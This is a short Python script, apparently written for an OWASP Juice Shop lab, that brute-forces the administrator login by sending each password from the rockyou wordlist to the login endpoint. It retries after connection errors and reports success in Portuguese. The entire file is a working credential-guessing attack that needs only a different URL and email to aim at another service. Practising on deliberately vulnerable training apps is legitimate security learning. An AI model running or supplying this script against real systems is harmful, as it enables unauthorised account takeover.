import urllib.request, json, sys, time

url = 'http://<server_address>:3000/rest/user/login'
email = 'admin@juice-sh.op'
wordlist = '/usr/share/wordlists/rockyou.txt'

with open(wordlist, 'r', encoding='latin-1') as f:
    for i, line in enumerate(f):
        password = line.strip()
        if not password:
            continue

        payload = {'email': email, 'password': password}
        data = json.dumps(payload).encode()
        req = urllib.request.Request(
            url,
            data=data,
            headers={'Content-Type': 'application/json'}
        )

        try:
            res = urllib.request.urlopen(req, timeout=10)
            print(f'[+] SENHA ENCONTRADA: {password}')
            sys.exit(0)

        except urllib.error.HTTPError as e:
            print(f'[-] {i+1}: {password}')

        except (ConnectionResetError, TimeoutError, OSError) as e:
            print(f'[!] Erro de conexão em {password}, tentando de novo em 2s...')
            time.sleep(2)
            try:
                res = urllib.request.urlopen(req, timeout=10)
                print(f'[+] SENHA ENCONTRADA: {password}')
                sys.exit(0)
            except:
                print(f'[!] Falhou novamente, pulando...')
                continue